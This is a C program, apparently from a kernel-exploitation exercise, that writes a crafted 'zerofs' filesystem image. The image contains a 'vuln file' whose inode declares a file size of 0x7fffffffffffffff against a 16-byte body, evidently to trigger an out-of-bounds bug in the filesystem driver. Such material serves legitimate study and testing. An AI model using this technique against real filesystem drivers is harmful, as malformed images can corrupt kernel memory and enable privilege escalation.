#include <unistd.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

#include "zerofs.h"

#define VULNFILE_BLKNO (ZEROFS_LAST_RESERVED_BLKNO + 1)
#define VULNFILE_INO (ZEROFS_LAST_RESERVED_INO + 1)

static int write_sb(int fd)
{
	struct zerofs_super_block sb = {
		.magic = ZEROFS_MAGIC,
		.block_size = ZEROFS_DEFAULT_BLOCK_SIZE,
		.inode_count = VULNFILE_INO,
		.free_blocks = (~0) & ~((1 << (VULNFILE_BLKNO + 1)) - 1),
	};

	ssize_t ret;

	ret = write(fd, &sb, sizeof(sb));
	if (ret != ZEROFS_DEFAULT_BLOCK_SIZE) {
		printf("Fail to write super block.\n");
		return -1;
	}

	printf("Succeed to write super block.\n");
	return 0;
}

static int write_root_inode(int fd)
{
	struct zerofs_inode root_inode;
	ssize_t ret;

	root_inode.mode = S_IFDIR;
	root_inode.ino = ZEROFS_ROOTDIR_INO;
	root_inode.dno = ZEROFS_ROOTDIR_BLKNO;
	root_inode.children_count = 1; // the vuln file

	ret = write(fd, &root_inode, sizeof(root_inode));
	if (ret != sizeof(root_inode)) {
		printf("Fail to write root inode.\n");
		return -1;
	}

	printf("Succeed to write root inode.\n");
	return 0;
}

static int write_vulnfile_inode(int fd, const struct zerofs_inode *i)
{
	off_t nbytes;
	ssize_t ret;

	ret = write(fd, i, sizeof(*i));
	if (ret != sizeof(struct zerofs_inode)) {
		printf("Fail to write vuln file inode.\n");
		return -1;
	}

	// we have 2 inodes, root inode & vuln file inode
	nbytes = ZEROFS_DEFAULT_BLOCK_SIZE - (sizeof(struct zerofs_inode) * 2);
	ret = lseek(fd, nbytes, SEEK_CUR);
	if (ret == (off_t)-1) {
		printf("Fail to write padding bytes for inode map.\n");
		return -1;
	}

	printf("Succeed to write inode map.\n");
	return 0;
}

static int write_dirent(int fd, const struct zerofs_dir_record *record)
{
	ssize_t nbytes = sizeof(struct zerofs_dir_record);
	ssize_t ret;

	ret = write(fd, record, nbytes);
	if (ret != nbytes) {
		printf("Fail to write the directory entry for vulnerable file.\n");
		return -1;
	}

	printf("Succeed to write the directory entry for vulnerable file.\n");

	nbytes = ZEROFS_DEFAULT_BLOCK_SIZE - sizeof(struct zerofs_dir_record);
	ret = lseek(fd, nbytes, SEEK_CUR);
	if (ret == (off_t)-1) {
		printf("Fail to write padding bytes for root inode's directory entry.\n");
		return -1;
	}

	printf("Succeed to write root inode's directory entry.\n");
	return 0;
}

static int write_block(int fd, char *block, size_t len)
{
	ssize_t ret;
	ret = write(fd, block, len);
	if (ret != len) {
		printf("Fail to write file body.\n");
		return -1;
	}

	printf("Succeed to write file body.\n");
	return 0;
}

int main(int argc, char *argv[])
{
	int fd;
	ssize_t ret;

	char file_body[] = "AAAABBBBCCCCDDDD";
	struct zerofs_inode file = {
		.mode = S_IFREG,
		.ino = VULNFILE_INO,
		.dno = VULNFILE_BLKNO,
		.file_size = 0x7fffffffffffffff, // sizeof(file_body),
	};
	struct zerofs_dir_record record = {
		.filename = "file",
		.ino = VULNFILE_INO,
	};

	if (argc != 2) {
		printf("usage: ./mkfs <device> \n");
		return -1;
	}

	fd = open(argv[1], O_RDWR);
	if (fd == -1) {
		perror("Fail to open the device");
		return -1;
	}

	ret = 1;
	do {
		if (write_sb(fd))
			break;

		if (write_root_inode(fd))
			break;

		if (write_vulnfile_inode(fd, &file))
			break;

		if (write_dirent(fd, &record))
			break;

		if (write_block(fd, file_body, 16))
			break;

		ret = 0;
	} while (0);

	close(fd);
	return ret;
}

